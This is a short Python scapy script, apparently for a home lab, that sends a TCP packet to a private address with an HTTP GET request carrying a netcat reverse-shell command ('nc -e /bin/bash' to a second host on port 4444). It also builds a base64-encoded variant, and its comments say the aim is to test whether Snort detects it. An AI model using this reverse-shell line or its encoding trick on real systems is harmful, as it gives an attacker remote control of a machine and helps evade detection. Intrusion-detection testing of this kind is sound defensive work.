from scapy.all import IP, TCP, send

# Define the target IP and port
target_ip = "192.168.64.11"
target_port = 22 # Does not really make much sense to do this agains 22 but its to see if snort will detect it

# Create an obfuscated malicious reverse shell payload by using a different encoding
import base64
reverse_shell = "nc -e /bin/bash 192.168.64.12 4444"
encoded_payload = base64.b64encode(reverse_shell.encode()).decode()
print(encoded_payload)

# Craft the HTTP GET request with the encoded payload embedded in a parameter
http_request = f"GET /?data={reverse_shell} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
# http_request = f"GET /?data={encoded_payload} HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"

# Create the TCP packet
packet = IP(dst=target_ip) / TCP(dport=target_port, flags="PA") / http_request

# Send the packet
send(packet)
